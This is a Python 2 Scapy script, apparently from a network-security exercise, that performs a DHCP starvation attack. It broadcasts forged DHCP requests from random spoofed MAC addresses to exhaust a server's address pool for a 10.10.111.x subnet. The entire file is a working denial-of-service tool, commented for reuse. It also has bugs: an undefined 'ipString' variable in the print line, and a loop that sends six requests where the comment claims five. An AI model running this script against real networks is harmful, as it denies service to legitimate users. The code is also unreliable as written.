#!/usr/bin/python

############################
# Author: Shaival Dalal    #
# Domain: Network Security #
# Aim:    DHCP Starvation  #
############################

## Importing basic libraries to enable DHCP starvation
from scapy.all import * # Since Scapy v2, the import procedure has been changed
from time import sleep # We use the time library's sleep function to insert a delay in every loop
import numpy as np # We use the numpy library to generate loop range as it is more efficient in dealing with larger numbers than the inbuilt range function

## We define constant string values to be used in creating our frame
subnetString="10.10.111." # The string that we use to create IP addresses for the subnet
destinationBroadcast='ff:ff:ff:ff:ff:ff' # Unknown MAC address used while making the request for IP
ipSource='0.0.0.0' # The source IP address used to make the request
ipDest='255.255.255.255' # The broadcast address on which the client sends the DHCP request to locate the server

## We create a for loop to generate numbers between 100 and 201(non-inclusive) to create unique IP addresses for our subnet
for requested in np.arange(100,201):
	## We create a new for loop to send each request 5 times to take into consideration failed transmissions, network congestion, transmission delays and other factors
	for forceACK in np.arange(0,6):
		fakeMAC=RandMAC() #We create a new MAC address for every request that we make

		'''
		Ethernet: We create a new Ethernet frame containing the source MAC addresss
		as the one that we generated (fakeMAC) and the destination as the broadcast
		address for the subnet (destinationBroadcast).
		IP: Source is 0.0.0.0 (ipSource) and destination is	255.255.255.255 (ipDest).
		UDP: We use the source UDP port as 68 and the destination as 67
		BOOTP: Since DHCP is based on the BOOTP protocol, we pass an additional
		parameter called chaddr which contains our MAC address (fakeMAC)
		DHCP: Since we directly execute the 3rd stage of the handshake, we 'request'
		a specific IP (requested_ip) using a combination of our subnet and our
		generated number (requested)
		'''
		requestIP=Ether(src=fakeMAC,dst=destinationBroadcast)/IP(src=ipSource,dst=ipDest)/UDP(sport=68,dport=67)/BOOTP(chaddr=fakeMAC)/DHCP(options=[('message-type','request'),('requested_addr',subnetString+str(requested)),'end'])
		
		sendp(requestIP) # We use sendp to send Ethernet frames while send is used for IP packets
		print "Requesting IP: "+ipString+str(requested)+" using MAC: "+fakeMAC
		sleep(0.5)	# Inserting a delay to prevent packet loss due to congeestion, delay and other factors
